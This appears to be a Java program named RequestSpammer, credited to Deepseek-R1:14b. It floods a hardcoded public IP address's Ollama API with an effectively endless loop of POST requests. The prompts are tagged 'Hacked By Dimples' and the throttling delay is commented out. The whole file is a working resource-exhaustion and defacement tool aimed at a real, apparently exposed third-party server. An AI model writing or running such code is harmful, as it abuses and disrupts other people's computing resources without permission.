// Thanks: Deepseek-R1:14b
package net.deepseek;

import cn.a114.utils.SoutUtils;
import com.google.gson.*;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Random;

public class RequestSpammer {

    // 加载单词文件的输入流
    public static InputStream WORDS_TXT_STREAM = RequestSpammer.class.getResourceAsStream("/words.txt");

    // Ollama API的基础URL
    public static final String BASE_URL = "http://47.120.73.123:11434/api/generate";

    // 使用的模型名称
    private static final String MODEL_NAME = "deepseek-r1:latest";

    // 发送请求的数量
    private static final int NUM_REQUESTS = Integer.MAX_VALUE;


    public static void main(String[] args) {
        SoutUtils.out("RequestSpammer is running");
        try {
            // 循环发送请求，直到达到最大请求数
            for (int i = 0; i < NUM_REQUESTS; i++) {
                // 创建请求的提示词
                String prompt = "Hacked By Dimples#" + i;

                // 生成随机单词
                String randomWords = randomWords(new Random().nextInt(8), true, WORDS_TXT_STREAM);

                // 指定请求是否包含不安全内容
                boolean isUnsafe = true;

                try {
                    // 发送请求
                    sendRequest(prompt, randomWords, isUnsafe);
                    SoutUtils.out("Try to Spam");
                } catch (OutOfMemoryError e) {
                    // 处理内存溢出错误
                    SoutUtils.out(e.getClass().getCanonicalName());

                    // 强制垃圾回收
                    System.gc();
                }
            }
            // 这里可以添加使用线程池并发发送请求的代码
        } catch (Throwable e) {
            // 捕获异常并输出错误消息
            SoutUtils.out("Error: " + e.getMessage());
        }
    }

    // 生成指定数量的随机单词
    public static synchronized String randomWords(int wordCount, boolean shouldSpace, InputStream iStream) throws IOException {
        String words = "";
        // 循环读取随机单词
        for (int i = 0; i < wordCount; i++) {
            String word = readWordsFromStream(new Random().nextInt(466550), iStream);
            words += (word + (shouldSpace ? " " : ""));
        }
        return words.trim(); // 返回生成的单词，去掉末尾空格
    }

    // 从输入流中根据行号读取单词
    public static String readWordsFromStream(int line, InputStream stream) throws IOException {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(stream));
        String words = "";

        // 同步访问输入流，防止并发问题
        synchronized (bufferedReader) {
            // 跳过指定的行数
            for (int i = 0; i < line; i++) {
                bufferedReader.readLine();
            }
            // 读取当前行的单词
            words = bufferedReader.readLine();
        }
        return words; // 返回读取的单词
    }

    // 格式化JSON字符串
    public static String prettyPrintUsingGson(String uglyJson) {
        Gson gson = new GsonBuilder().setPrettyPrinting().create();
        JsonElement jsonElement = JsonParser.parseString(uglyJson);
        // 返回格式化后的JSON字符串
        return gson.toJson(jsonElement);
    }

    // 发送请求到Ollama API
    private static synchronized void sendRequest(String prompt, String message, boolean isUnsafe) {
        try {
            // Create the request body
            JsonObject jobj = new JsonObject();



            jobj.addProperty("model", MODEL_NAME);
            jobj.addProperty("prompt", prompt);
            jobj.addProperty("message", message);
            jobj.addProperty("is_unsafe", isUnsafe);

            URL url = new URL(BASE_URL);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();

            // Set headers
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(true);

            // Write the request body
            OutputStream requestOutputStream = /*CONNECTION OUTPUTSTREAM*/connection.getOutputStream();
            requestOutputStream.write(jobj.toString().getBytes(StandardCharsets.UTF_8));
            requestOutputStream.flush();


            // Add a small delay to prevent overwhelming the server
            // Thread.sleep(1000L);

            // Get response
            int statusCode = connection.getResponseCode();
            SoutUtils.out("Status Code: " + statusCode);
            InputStream istream;
            try {
                istream = connection.getInputStream();
            } catch (IOException e) {
                SoutUtils.out("Variable istream failed to initialization, return;");
                return;
            }

//            String f = "";
//            synchronized (BASE_URL) {
//                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
//                String is;
//                while ((is = br.readLine()) != null) {
//                    f += is+",";
//                }
//            }
//
//            String temp0 = "["+f+"]";
//
//
//            SoutUtils.logger.info(prettyPrintUsingGson(temp0));

//            SoutUtils.out("Response: " + prettyPrintUsingGson(temp0));



        } catch (Exception e) {
            synchronized ("") {
                e.printStackTrace();
            }
        }
    }
}
